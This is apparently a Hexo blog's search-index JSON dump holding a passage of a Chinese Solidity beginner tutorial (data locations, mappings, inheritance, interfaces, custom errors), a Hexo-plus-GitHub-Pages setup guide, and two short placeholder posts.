[uint256(1),2,5]);\n    }\n改为\n// 命名式返回\nfunction returnNamed() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array){\n    _number = 2;\n    _bool = false; \n    _array = [uint256(3),2,1];\n}\nTip:也可以在命名式返回中用return来返回变量，跟第一种一样\n解构式赋值\n读取所有返回值：声明变量，并且将要赋值的变量用,隔开，按顺序排列。\n\nuint256 _number;\nbool _bool;\nuint256[3] memory _array;\n(_number, _bool, _array) = returnNamed();\n\n读取部分返回值：声明要读取的返回值对应的变量，不读取的留空。下面这段代码中，我们只读取_bool，而不读取返回的_number和_array：\n\n(, _bool2, ) = returnNamed();\n5.变量数据存储和作用域引用类型(Reference Type)数组(array)、结构体(struct)和映射(mapping)，这类变量占空间大，赋值时候直接传递地址（类似指针）。由于这类变量比较复杂，占用存储空间大，我们在使用时必须要声明数据存储的位置。\n数据位置storage、memory和calldata。不同存储位置的gas成本不同：storage类型的数据存在链上，类似计算机的硬盘，消耗gas多；memory和calldata类型的临时存在内存里，消耗gas少。\n\nstorage：合约里的状态变量默认都是storage，存储在链上。\nmemory：函数里的参数和临时变量一般用memory，存储在内存中，不上链。\ncalldata：和memory类似，存储在内存中，不上链。与memory的不同点在于calldata变量不能修改（immutable），一般用于函数的参数。eg：\n\nfunction fCalldata(uint[] calldata _x) public pure returns(uint[] calldata){\n    //参数为calldata数组，不能被修改\n    // _x[0] = 0 //这样修改会报错\n    return(_x);\n}\n赋值规则在不同存储类型相互赋值时候，有时会产生独立的副本（修改新变量不会影响原变量），有时会产生引用（修改新变量会影响原变量）。规则如下：\n\nstorage（合约的状态变量）赋值给本地storage（函数里的）时候，会创建引用，改变新变量会影响原变量。eg：\n\nuint[] x = [1,2,3]; // 状态变量：数组 x\n\nfunction fStorage() public{\n    //声明一个storage的变量 xStorage，指向x。修改xStorage也会影响x\n    uint[] storage xStorage = x;\n    xStorage[0] = 100;\n}\n\nstorage赋值给memory，会创建独立的复本，修改其中一个不会影响另一个；反之亦然。\n\nuint[] x = [1,2,3]; // 状态变量：数组 x\n\nfunction fMemory() public view{\n    //声明一个Memory的变量xMemory，复制x。修改xMemory不会影响x\n    uint[] memory xMemory = x;\n    xMemory[0] = 100;\n    xMemory[1] = 200;\n    uint[] memory xMemory2 = x;\n    xMemory2[0] = 300;\n}\ndebug康康\n\n\n\nmemory赋值给memory，会创建引用，改变新变量会影响原变量\n其他情况，变量赋值给storage，会创建独立的复本，修改其中一个不会影响另一个\n\n作用域\n状态变量数据存储在链上的变量，所有的合约内的函数都可以访问，gas消耗高。状态变量在合约内、函数外声明（可以在函数里更改状态变量的值）\n\n局部变量局部变量是仅在函数执行过程中有效的变量，函数退出后，变量无效。局部变量的数据存储在内存里，不上链，gas低。局部变量在函数内声明\n\n\nfunction bar() external pure returns(uint){\n    uint xx = 1;\n    uint yy = 3;\n    uint zz = xx + yy;\n    return(zz);\n}\n\n全局变量全局变量是全局范围工作的变量，都是solidity预留关键字（可以在函数内不声明直接使用）\n\nfunction global() external view returns(address, uint, bytes memory){\n    address sender = msg.sender;\n    uint blockNum = block.number;\n    bytes memory data = msg.data;\n    return(sender, blockNum, data);\n}\n\n6.引用类型数组array数组（Array）是solidity常用的一种变量类型，用来存储一组数据（整数，字节，地址等等）\n\n固定长度数组：在声明时指定数组的长度。用T[k]的格式表明，其中T是元素的类型，k是长度，eg:\n\n// 固定长度 Array\nuint[8] array1;\nbytes1[5] array2;\naddress[100] array3;\n\n可变长度数组（动态数组）：在声明时不指定数值的长度。用T[]的格式表明，其中T是元素的类型（bytes比较特殊，是数组，但是不加[]），eg：\n\n// 可变长度 Array\nuint[] array4;\nbytes1[] array5;\naddress[] array6;\nbytes array7;\n创建数组的规则\n对于memory修饰的动态数组，可以用new操作符来创建，但是必须声明长度，并且声明后长度不能改变，eg：\n\n// memory动态数组\nuint[] memory array8 = new uint[](5);\nbytes memory array9 = new bytes(9);\n\n数组字面常数（Array Literals）是写作表达形式的数组，用方括号包着来初始化array的一种方式，并且里面每一个元素的type是以第一个元素为准的，例如[1,2,3]里面所有的元素都是uint8类型，因为在solidity中如果一个值没有指定type的话，默认就是最小单位的该type，这里int的默认最小单位类型就是uint8。而[uint(1),2,3]里面的元素都是uint类型，因为第一个元素指定了是uint类型了，我们都以第一个元素为准。下面的合约中，对于f函数里面的调用，如果我们没有显式对第一个元素进行uint强转的话，是会报错的，因为如上所述我们其实是传入了uint8类型的array，可是g函数需要的却是uint类型的array，就会报错了。\n\n// SPDX-License-Identifier: GPL-3.0\npragma solidity &gt;=0.4.16 &lt;0.9.0;\ncontract C {\n    function f() public pure {\n        g([uint(1), 2, 3]);\t //uint(1)强转了。如果是g([1,2,3]),就是uint8类型\n    }\n    function g(uint[3] memory) public pure {\t//g()这边传入的是uint类型\n        // ...\n    }\n}\n\n如果创建的是动态数组，你需要一个一个元素的赋值。\n\nuint[] memory x = new uint[](3);\nx[0] = 1;\nx[1] = 3;\nx[2] = 4;\n数组成员\n结构体创建结构体\n// 结构体\nstruct Student{\n    uint256 id;\n    uint256 score; \n}\nStudent student; // 初始一个student结构体\n给结构体赋值的两种方法\n//  给结构体赋值\n// 方法1:在函数中创建一个storage的struct引用\nfunction initStudent1() external{\n    Student storage _student = student; // assign a copy of student\n    _student.id = 11;\n    _student.score = 100;\n}\n // 方法2:直接引用状态变量的struct\nfunction initStudent2() external{\n    student.id = 1;\n    student.score = 80;\n}\n7.映射类型mapping在映射中，人们可以通过键（Key）来查询对应的值（Value），比如：通过一个人的id来查询他的钱包地址。mapping(_KeyType =&gt; _ValueType)eg:\nmapping(uint =&gt; address) public idToAddress; // id映射到地址\nmapping(address =&gt; address) public swapPair; // 币对的映射，地址到地址\n映射的规则\n规则1：映射的_KeyType只能选择solidity默认的类型，比如uint，address等，不能用自定义的结构体。而_ValueType可以使用自定义的类型。\n规则2：映射的存储位置必须是storage，因此可以用于合约的状态变量，函数中的storage变量。不能用于public函数的参数或返回结果中，因为mapping记录的是一种关系 (key - value pair)。\n规则3：如果映射声明为public，那么solidity会自动给你创建一个getter函数，可以通过Key来查询对应的Value。\n规则4：给映射新增的键值对的语法为_Var[_Key] = _Value，其中_Var是映射变量名，_Key和_Value对应新增的键值对。eg：\n\nfunction writeMap (uint _Key, address _Value) public{\n    idToAddress[_Key] = _Value;\n}\n映射的原理\n原理1：映射不储存任何键（Key）的资讯，也没有length的资讯。\n原理2：映射使用keccak256(key)当成offset存取value。\n原理3：因为Ethereum会定义所有未使用的空间为0，所以未赋值（Value）的键（Key）初始值都是0。\n\n8.变量初始值声明但没赋值的变量都是有初始值\n值类型初始值\nboolean:false\nstring:\"\"\nint:0\nuint:o\nenum:枚举的第一个元素\naddress:0x0000000000000000000000000000000000000000(或address(0))\nfunction\ninternal:空白方程\nexternal:空白方程\n\n\n\n可以用public变量的getter函数验证初始值：\nbool public _bool;\n......\n引用类型初始值\n映射mapping：所有元素都为其默认值的mapping\n结构体struct：所有成员都设为其默认值的结构题\n数组array：\n动态数组：[]\n静态数组：所有成员设为其默认值的静态数组\n\n\n\n验证方式一样，eg：\nmapping(uint =&gt; address) public _mapping; // 所有元素都为其默认值的mapping\n\n    // 所有成员设为其默认值的结构体 0, 0\nstruct Student{\n    uint256 id;\n    uint256 score; \n}\nStudent public student;\ndelete操作符delete a会让变量a的值变为初始值\n9.常数constant（常量）和immutable（不变量）。状态变量声明这个两个关键字之后，不能在合约后更改数值；并且还可以节省gas。另外，只有数值变量可以声明constant和immutable；string和bytes可以声明为constant，但不能为immutable。\nconstantconstant变量必须在声明的时候初始化，之后再也不能改变。尝试改变的话，编译不通过。\n// constant变量必须在声明的时候初始化，之后不能改变\nuint256 constant CONSTANT_NUM = 10;\nstring constant CONSTANT_STRING = \"0xAA\";\nbytes constant CONSTANT_BYTES = \"WTF\";\naddress constant CONSTANT_ADDRESS = 0x0000000000000000000000000000000000000000;\nimmutableimmutable变量可以在声明时或构造函数中初始化，因此更加灵活。\n// immutable变量可以在constructor里初始化，之后不能改变\nuint256 public immutable IMMUTABLE_NUM = 9999999999;\naddress public immutable IMMUTABLE_ADDRESS;\nuint256 public immutable IMMUTABLE_BLOCK;\nuint256 public immutable IMMUTABLE_TEST;\n可以使用全局变量例如address(this)，block.number ，或者自定义的函数给immutable变量初始化。在下面这个例子，我们利用了test()函数给IMMUTABLE_TEST初始化为9：\n// 利用constructor初始化immutable变量，因此可以利用\nconstructor(){\n    IMMUTABLE_ADDRESS = address(this);\n    IMMUTABLE_BLOCK = block.number;\n    IMMUTABLE_TEST = test();\n}\n\nfunction test() public pure returns(uint256){\n    uint256 what = 9;\n    return(what);\n}\n10.控制流\nif-else\nfor循环\nwhie循环\ndo-while循环\n三元运算符：三元运算符是solidity中唯一一个接受三个操作数的运算符，规则条件? 条件为真的表达式:条件为假的表达式。 此运算符经常用作 if 语句的快捷方式。\n\n// 三元运算符 ternary/conditional operator\nfunction ternaryTest(uint256 x, uint256 y) public pure returns(uint256){\n    // return the max of x and y\n    return x &gt;= y ? x: y; \n}\n用solidity实现插入排序插入排序排序算法解决的问题是将无序的一组数字，例如[2, 5, 3, 1]，从小到大依次排列好。（思路：从前往后，依次将每一个数和排在他前面的数字比大小，如果比前面的数字小，就互换位置。）\n贴个python代码\n# Python program for implementation of Insertion Sort\ndef insertionSort(arr):\n    for i in range(1, len(arr)):\n        key = arr[i]\n        j = i-1\n        while j &gt;=0 and key &lt; arr[j] :\n                arr[j+1] = arr[j]\n                j -= 1\n        arr[j+1] = key\n改写成solidity后有BUG！\n// 插入排序 错误版\nfunction insertionSortWrong(uint[] memory a) public pure returns(uint[] memory) {\n    \n    for (uint i = 1;i &lt; a.length;i++){\n        uint temp = a[i];\n        uint j=i-1;\n        while( (j &gt;= 0) &amp;&amp; (temp &lt; a[j])){\n            a[j+1] = a[j];\n            j--;\n        }\n        a[j+1] = temp;\n    }\n    return(a);\n}\n原因：solidity中最常用的变量类型是uint，也就是正整数，取到负值的话，会报underflow错误。而在插入算法中，变量j有可能会取到-1，引起报错。这里把j加1，让它无法取到赋值\n// 插入排序 正确版\nfunction insertionSort(uint[] memory a) public pure returns(uint[] memory) {\n    // note that uint can not take negative value\n    for (uint i = 1;i &lt; a.length;i++){\n        uint temp = a[i];\n        uint j=i;\n        while( (j &gt;= 1) &amp;&amp; (temp &lt; a[j-1])){\n            a[j] = a[j-1];\n            j--;\n        }\n        a[j] = temp;\n    }\n    return(a);\n}\n11.构造函数和修饰器构造函数构造函数（constructor）是一种特殊的函数，每个合约可以定义一个，并在部署合约的时候自动运行一次。它可以用来初始化合约的一些参数，例如初始化合约的owner地址：\naddress owner; // 定义owner变量\n\n// 构造函数\nconstructor() {\n   owner = msg.sender; // 在部署合约的时候，将owner设置为部署者的地址\n}\nTip:构造函数在不同的solidity版本中的语法并不一致，在Solidity 0.4.22之前，构造函数不使用 constructor 而是使用与合约名同名的函数作为构造函数而使用，由于这种旧写法容易使开发者在书写时发生疏漏（例如合约名叫 Parents，构造函数名写成 parents），使得构造函数变成普通函数，引发漏洞，所以0.4.22版本及之后，采用了全新的 constructor 写法。\npragma solidity =0.4.21;\ncontract Parents {\n    // 与合约名Parents同名的函数就是构造函数\n    function Parents () public {\n    }\n}\n修饰器修饰器（modifier）是solidity特有的语法，类似于面向对象编程中的decorator，声明函数拥有的特性，并减少代码冗余。modifier的主要使用场景是运行函数前的检查，例如地址，变量，余额等。\n// 定义modifier\nmodifier onlyOwner {\n   require(msg.sender == owner); // 检查调用者是否为owner地址\n   _; // 如果是的话，继续运行函数主体；否则报错并revert交易\n}\n带有onlyOwner修饰符的函数只能被owner地址调用，比如下面这个例子：\nfunction changeOwner(address _newOwner) external onlyOwner{\n   owner = _newOwner; // 只有owner地址运行这个函数，并改变owner\n}\n我们定义了一个changeOwner函数，运行他可以改变合约的owner，但是由于onlyOwner修饰符的存在，只有原先的owner可以调用，别人调用就会报错。这也是最常用的控制智能合约权限的方法。\n12.事件Solidity中的事件（event）是EVM上日志的抽象，它具有两个特点：\n\n应用程序（ether.js）可以通过RPC接口订阅和监听这些事件，并在前端做响应。\n事件是EVM上比较经济的存储数据的方式，每个大概消耗2,000 gas；相比之下，链上存储一个新变量至少需要20,000 gas。\n\n规则事件的声明由event关键字开头，然后跟事件名称，括号里面写好事件需要记录的变量类型和变量名。以ERC20代币合约的Transfer事件为例：\nevent Transfer(address indexed from, address indexed to, uint256 value);\nTransfer事件共记录了3个变量from，to和value，分别对应代币的转账地址，接收地址和转账数量。\n同时from和to前面带着indexed关键字，每个indexed标记的变量可以理解为检索事件的索引“键”，在以太坊上单独作为一个topic进行存储和索引，程序可以轻松的筛选出特定转账地址和接收地址的转账事件。每个事件最多有3个带indexed的变量。每个 indexed 变量的大小为固定的256比特。事件的哈希以及这三个带indexed的变量在EVM日志中通常被存储为topic。其中topic[0]是此事件的keccak256哈希，topic[1]到topic[3]存储了带indexed变量的keccak256哈希。\nvalue 不带 indexed 关键字，会存储在事件的 data 部分中，可以理解为事件的“值”。data 部分的变量不能被直接检索，但可以存储任意大小的数据。因此一般 data 部分可以用来存储复杂的数据结构，例如数组和字符串等等，因为这些数据超过了256比特，即使存储在事件的 topic 部分中，也是以哈希的方式存储。另外，data 部分的变量在存储上消耗的gas相比于 topic 更少。\n可以在函数里释放事件：\n// 定义_transfer函数，执行转账逻辑\nfunction _transfer(\n    address from,\n    address to,\n    uint256 amount\n) external {\n\n    _balances[from] = 10000000; // 给转账地址一些初始代币\n\n    _balances[from] -=  amount; // from地址减去转账数量\n    _balances[to] += amount; // to地址加上转账数量\n\n    // 释放事件\n    emit Transfer(from, to, amount);\n}\n13.继承规则\nvirtual: 父合约中的函数，如果希望子合约重写，需要加上virtual关键字。\noverride：子合约重写了父合约中的函数，需要加上override关键字。\n\n简单继承（确实比较简单，直接贴例子）\n先写一个简单的爷爷合约Yeye，里面包含1个Log事件和3个function: hip(), pop(), yeye()，输出都是”Yeye”。\ncontract Yeye {\n    event Log(string msg);\n\n    // 定义3个function: hip(), pop(), man()，Log值为Yeye。\n    function hip() public virtual{\n        emit Log(\"Yeye\");\n    }\n\n    function pop() public virtual{\n        emit Log(\"Yeye\");\n    }\n\n    function yeye() public virtual {\n        emit Log(\"Yeye\");\n    }\n}\n再定义一个爸爸合约Baba，让他继承Yeye合约，语法就是contract Baba is Yeye，非常直观。在Baba合约里，我们重写一下hip()和pop()这两个函数，加上override关键字，并将他们的输出改为”Baba”；并且加一个新的函数baba，输出也是”Baba”。\ncontract Baba is Yeye{\n    // 继承两个function: hip()和pop()，输出改为Baba。\n    function hip() public virtual override{\n        emit Log(\"Baba\");\n    }\n\n    function pop() public virtual override{\n        emit Log(\"Baba\");\n    }\n\n    function baba() public virtual{\n        emit Log(\"Baba\");\n    }\n}\n部署合约，可以看到Baba合约里有4个函数，其中hip()和pop()的输出被成功改写成”Baba”，而继承来的yeye()的输出仍然是”Yeye”。\n多重继承solidity合约可以继承多个合约\n继承时要按辈分最高到最低的顺序排。比如我们写一个Erzi合约，继承Yeye合约和Baba合约，那么就要写成contract Erzi is Yeye, Baba，而不能写成contract Erzi is Baba, Yeye，不然就会报错。 如果某一个函数在多个继承的合约里都存在，比如例子中的hip()和pop()，在子合约里必须重写，不然会报错。 重写在多个父合约中都重名的函数时，override关键字后面要加上所有父合约名字，例如override(Yeye, Baba)。 例子：\ncontract Erzi is Yeye, Baba{\n    // 继承两个function: hip()和pop()，输出值为Erzi。\n    function hip() public virtual override(Yeye, Baba){\n        emit Log(\"Erzi\");\n    }\n\n    function pop() public virtual override(Yeye, Baba) {\n        emit Log(\"Erzi\");\n    }\n修饰器的继承Solidity中的修饰器（Modifier）同样可以继承，用法与函数继承类似，在相应的地方加virtual和override关键字即可。\ncontract Base1 {\n    modifier exactDividedBy2And3(uint _a) virtual {\n        require(_a % 2 == 0 &amp;&amp; _a % 3 == 0);\n        _;\n    }\n}\n\ncontract Identifier is Base1 {\n\n    //计算一个数分别被2除和被3除的值，但是传入的参数必须是2和3的倍数\n    function getExactDividedBy2And3(uint _dividend) public exactDividedBy2And3(_dividend) pure returns(uint, uint) {\n        return getExactDividedBy2And3WithoutModifier(_dividend);\n    }\n\n    //计算一个数分别被2除和被3除的值\n    function getExactDividedBy2And3WithoutModifier(uint _dividend) public pure returns(uint, uint){\n        uint div2 = _dividend / 2;\n        uint div3 = _dividend / 3;\n        return (div2, div3);\n    }\n}\nIdentifier合约可以直接在代码中使用父合约中的exactDividedBy2And3修饰器，也可以利用override关键字重写修饰器：\nmodifier exactDividedBy2And3(uint _a) override {\n    _;\n    require(_a % 2 == 0 &amp;&amp; _a % 3 == 0);\n}\n构造函数的继承子合约有两种方法继承父合约的构造函数。举个简单的例子，父合约A里面有一个状态变量a，并由构造函数的参数来确定：\n// 构造函数的继承\nabstract contract A {\n    uint public a;\n\n    constructor(uint _a) {\n        a = _a;\n    }\n}\n1.在继承时声明父构造函数的参数，例如：contract B is A(1)2.在子合约的构造函数中声明构造函数的参数，例如：\ncontract C is A {\n    constructor(uint _c) A(_c * _c) {}\n}\n调用父合约的函数子合约有两种调用父合约的函数\n\n直接调用：子合约可以直接用父合约名.函数名()的方式来调用父合约函数，例如Yeye.pop()。\n\nfunction callParent() public{\n    Yeye.pop();\n}\n\nsuper关键字：子合约可以利用super.函数名()来调用最近的父合约函数。solidity继承关系按声明时从右到左的顺序是：contract Erzi is Yeye, Baba，那么Baba是最近的父合约，super.pop()将调用Baba.pop()而不是Yeye.pop()：\n\nfunction callParentSuper() public{\n    // 将调用最近的父合约函数，Baba.pop()\n    super.pop();\n}\n14.抽象合约和接口抽象合约如果一个智能合约里至少有一个未实现的函数，即某个函数缺少主体{}中的内容，则必须将该合约标为abstract，不然编译会报错；另外，未实现的函数需要加virtual，以便子合约重写。拿我们之前的插入排序合约为例，如果我们还没想好具体怎么实现插入排序函数，那么可以把合约标为abstract，之后让别人补写上。\nabstract contract InsertionSort{\n    function insertionSort(uint[] memory a) public pure virtual returns(uint[] memory);\n}\n接口接口类似于抽象合约，但不实现任何功能。规则：\n\n不能包含状态变量\n不能包含构造函数\n不能继承除接口外的其他合约\n所有函数都必须是external且不能有函数体\n继承接口的合约必须实现接口定义的所有功能\n\n虽然接口不实现任何功能，但它非常重要。接口是智能合约的骨架，定义了合约的功能以及如何触发它们：如果智能合约实现了某种接口（比如ERC20或ERC721），其他Dapps和智能合约就知道如何与它交互。因为接口提供了两个重要的信息：1.合约里每个函数的bytes4选择器，以及基于它们的函数签名函数名(每个参数类型）。2.接口id（更多信息见EIP165）\n另外，接口与合约ABI（Application Binary Interface）等价，可以相互转换：编译接口可以得到合约的ABI，利用abi-to-sol工具也可以将ABI json文件转换为接口sol文件。\n我们以ERC721接口合约IERC721为例，它定义了3个event和9个function，所有ERC721标准的NFT都实现了这些函数。我们可以看到，接口和常规合约的区别在于每个函数都以;代替函数体{ }结尾。\ninterface IERC721 is IERC165 {\n    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);\n    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);\n    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\n    \n    function balanceOf(address owner) external view returns (uint256 balance);\n\n    function ownerOf(uint256 tokenId) external view returns (address owner);\n\n    function safeTransferFrom(address from, address to, uint256 tokenId) external;\n\n    function transferFrom(address from, address to, uint256 tokenId) external;\n\n    function approve(address to, uint256 tokenId) external;\n\n    function getApproved(uint256 tokenId) external view returns (address operator);\n\n    function setApprovalForAll(address operator, bool _approved) external;\n\n    function isApprovedForAll(address owner, address operator) external view returns (bool);\n\n    function safeTransferFrom( address from, address to, uint256 tokenId, bytes calldata data) external;\n}\nIERC721事件IERC721包含3个事件，其中Transfer和Approval事件在ERC20中也有。\n\nTransfer事件：在转账时被释放，记录代币的发出地址from，接收地址to和tokenid。\nApproval事件：在授权时释放，记录授权地址owner，被授权地址approved和tokenid。\nApprovalForAll事件：在批量授权时释放，记录批量授权的发出地址owner，被授权地址operator和授权与否的approved。\n\nIERC721函数\nbalanceOf：返回某地址的NFT持有量balance。\nownerOf：返回某tokenId的主人owner。\ntransferFrom：普通转账，参数为转出地址from，接收地址to和tokenId。\nsafeTransferFrom：安全转账（如果接收方是合约地址，会要求实现ERC721Receiver接口）。参数为转出地址from，接收地址to和tokenId。\napprove：授权另一个地址使用你的NFT。参数为被授权地址approve和tokenId。\ngetApproved：查询tokenId被批准给了哪个地址。\nsetApprovalForAll：将自己持有的该系列NFT批量授权给某个地址operator。\nisApprovedForAll：查询某地址的NFT是否批量授权给了另一个operator地址。\nsafeTransferFrom：安全转账的重载函数，参数里面包含了data。\n\n什么时候使用接口如果我们知道一个合约实现了IERC721接口，我们不需要知道它具体代码实现，就可以与它交互。\n无聊猿BAYC属于ERC721代币，实现了IERC721接口的功能。我们不需要知道它的源代码，只需知道它的合约地址，用IERC721接口就可以与它交互，比如用balanceOf()来查询某个地址的BAYC余额，用safeTransferFrom()来转账BAYC。\ncontract interactBAYC {\n    // 利用BAYC地址创建接口合约变量（ETH主网）\n    IERC721 BAYC = IERC721(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);\n\n    // 通过接口调用BAYC的balanceOf()查询持仓量\n    function balanceOfBAYC(address owner) external view returns (uint256 balance){\n        return BAYC.balanceOf(owner);\n    }\n\n    // 通过接口调用BAYC的safeTransferFrom()安全转账\n    function safeTransferFromBAYC(address from, address to, uint256 tokenId) external{\n        BAYC.safeTransferFrom(from, to, tokenId);\n    }\n}\n15.异常写智能合约经常会出bug，solidity中的异常命令帮助我们debug。\nErrorerror是solidity 0.8版本新加的内容，方便且高效（省gas）地向用户解释操作失败的原因。人们可以在contract之外定义异常。下面，我们定义一个TransferNotOwner异常，当用户不是代币owner的时候尝试转账，会抛出错误：\nerror TransferNotOwner(); // 自定义error\n在执行当中，error必须搭配revert（回退）命令使用。\nfunction transferOwner1(uint256 tokenId, address newOwner) public {\n    if(_owners[tokenId] != msg.sender){\n        revert TransferNotOwner();\n    }\n    _owners[tokenId] = newOwner;\n}\n我们定义了一个transferOwner1()函数，它会检查代币的owner是不是发起人，如果不是，就会抛出TransferNotOwner异常；如果是的话，就会转账。\nRequirerequire命令是solidity 0.8版本之前抛出异常的常用方法，目前很多主流合约仍然还在使用它。它很好用，唯一的缺点就是gas随着描述异常的字符串长度增加，比error命令要高。使用方法：require(检查条件，\"异常的描述\")，当检查条件不成立的时候，就会抛出异常。\n我们用require命令重写一下上面的transferOwner函数：\nfunction transferOwner2(uint256 tokenId, address newOwner) public {\n    require(_owners[tokenId] == msg.sender, \"Transfer Not Owner\");\n    _owners[tokenId] = newOwner;\n}\n贴个在remix上验证的例子吧1.输入任意uint256数字和非0地址，调用transferOwner1，也就是error方法，控制台抛出了异常并显示我们自定义的TransferNotOwner。2.输入任意uint256数字和非0地址，调用transferOwner2，也就是require方法，控制台抛出了异常并打印出require中的字符串。3.输入任意uint256数字和非0地址，调用transferOwner3，也就是assert方法，控制台只抛出了异常。\nAssertassert命令一般用于程序员写程序debug，因为它不能解释抛出异常的原因（比require少个字符串）。它的用法很简单，assert(检查条件），当检查条件不成立的时候，就会抛出异常。\n我们用assert命令重写一下上面的transferOwner函数：\nfunction transferOwner3(uint256 tokenId, address newOwner) public {\n    assert(_owners[tokenId] == msg.sender);\n    _owners[tokenId] = newOwner;\n}\n三种方法的gas比较我们比较一下三种抛出异常的gas消耗，通过remix控制台的Debug按钮，能查到每次函数调用的gas消耗分别如下：\n\nerror方法gas消耗：24445\nrequire方法gas消耗：24743\nassert方法gas消耗：24446\n\n我们可以看到，error方法gas最少，其次是assert，require方法消耗gas最多！因此，error既可以告知用户抛出异常的原因，又能省gas，大家要多用！（注意，由于部署测试时间的不同，每个函数的gas消耗会有所不同，但是比较结果会是一致的。）\n","slug":"solidity入门","date":"2022-11-26T16:55:02.000Z","categories_index":"","tags_index":"solidity","author_index":"cocoZ"},{"id":"4a8c6c67f0d77f1d7a087ca184ac4b68","title":"hexo+github搭建个人博客","content":"搭建个人博客（hexo+github）准备工作安装git、安装node.js、还有npm啥的（在看到任务前就装好了的）\n在github上创建仓库仓库名字要和用户名一样！！！（github pages等一会儿就出来了）\n\n安装hexo桌面创建一个文件夹，在文件夹目录下打开git bash here\n\n安装hexonpm install -g hexo-cli\n查看版本hexo -v\n初始化hexo、hexo init\n生成本地的hexo页面hexo s\n输入hexo g生成静态网站\n输入hexo s，然后浏览器打开localhost:4000，就可以本地访问了（Ctrl+c退出）\n连接GitHub与本地绑定个密钥：生成SSH Keysssh-keygen -t rsa -C \"你的邮箱地址\"\n在C/用户/16017/.ssh目录下打开这个，复制\n\n打开github的总setting，添加SSH Keys\n\n在目录下打开git bash here，输入以下命令git config --global user.name cocoGenZgit config --global user.email 160760796@qq.com\n打开博客根目录下的_config.yml文件，修改最后一行的配置type: git\nrepository: https://github.com/cocoGenZ/cocoGenZ.github.io.git\nbranch: mainTip:上面的repository在GitHub里面复制HTTPS那个\n\n安装一键部署插件cnpm install hexo-deployer-git --save(不知道为什么有这个save的我安装不了，就另外装了个cnpm来安装)（更新完就ok了`npm -g install npm@latest）\n分别输入一下三条命令hexo clean   #清除缓存文件 db.json 和已生成的静态文件 publichexo g       #生成网站静态文件到默认设置的 public 文件夹(hexo generate 的缩写)hexo d       #自动生成网站静态文件，并部署到设定的仓库(hexo deploy 的缩写)\n最后访问博客的地址就可以啦https://cocogenz.github.io/\n\n改个主题吧安装一个yarn（命令行就能装，用npm来装）yarn add hexo-theme-aurora\n\n改改参数\n\n关于上传图片显示的问题将图片上传到网上，再用markdown引用https://sm.ms/这个网址很方便\n","slug":"hexo-github搭建个人博客","date":"2022-11-21T14:10:57.000Z","categories_index":"","tags_index":"博客","author_index":"cocoZ"},{"id":"7b9812fe6cbf2aba598dcdf2de807daf","title":"Test","content":"第一次搭博客，浅浅做个测试\n","slug":"Test","date":"2022-11-15T03:55:53.000Z","categories_index":"","tags_index":"","author_index":"cocoZ"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new \"My New Post\"\nMore info: Writing\nRun server$ hexo server\nMore info: Server\nGenerate static files$ hexo generate\nMore info: Generating\nDeploy to remote sites$ hexo deploy\nMore info: Deployment\n","slug":"hello-world","date":"2022-11-15T02:54:10.513Z","categories_index":"","tags_index":"","author_index":"cocoZ"}]